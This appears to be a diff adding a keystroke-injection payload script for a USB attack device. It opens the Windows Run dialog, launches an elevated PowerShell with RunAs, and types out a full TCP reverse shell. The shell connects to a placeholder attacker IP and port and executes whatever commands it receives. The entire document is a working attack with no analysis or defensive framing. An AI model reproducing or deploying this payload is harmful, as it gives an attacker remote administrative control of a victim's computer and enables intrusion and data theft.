@@ -1,0 +1,32 @@
+<time1>
+<GCMD>r
+<time1>
+cmd
+<RET>
+Start-Process powershell.exe -Verb RunAs
+<RET><time1><ARL><time1>
+<RET>
+$client = New-Object System.Net.Sockets.TCPClient("<REPALCE WITH ATTACKER'S IP>",<DECLARE ANY PORT>);
+<RET>
+$stream = $client.GetStream();
+<RET>
+[byte[]]$bytes = 0..65535 | % {0};
+<RET>
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+<RET>
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+<RET>
+$sendback = (iex $data 2>&1 | Out-String );
+<RET>
+$sendback2  = $sendback + "PS " + (pwd).Path + "> ";
+<RET>
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+<RET>
+$stream.Write($sendbyte,0,$sendbyte.Length);
+<RET>
+$stream.Flush();
+<RET>
+}
+<RET>
+$client.Close()
+<RET>
